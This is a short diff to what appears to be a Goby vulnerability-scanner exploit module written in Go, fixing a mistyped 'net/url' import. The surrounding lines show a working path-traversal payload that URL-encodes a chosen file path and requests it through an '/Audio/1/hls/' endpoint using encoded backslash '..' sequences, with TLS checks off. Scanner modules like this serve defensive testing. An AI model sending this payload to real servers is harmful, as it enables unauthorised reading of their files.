@@ -6,7 +6,7 @@ import (
 	"git.gobies.org/goby/goscanner/jsonvul"
 	"git.gobies.org/goby/goscanner/scanconfig"
 	"git.gobies.org/goby/httpclient"
-	"net/szUrl"
+	"net/url"
 	"strings"
 )
 
@@ -100,7 +100,7 @@ func init() {
 		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
 			file := ss.Params["File"].(string)
 			file = strings.Replace(file, "/", "\\", -1)
-			file = szUrl.QueryEscape(file)
+			file = url.QueryEscape(file)
 			uri := "/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5C" + file + "/stream.mp3/"
 			cfg := httpclient.NewGetRequestConfig(uri)
 			cfg.VerifyTls = false
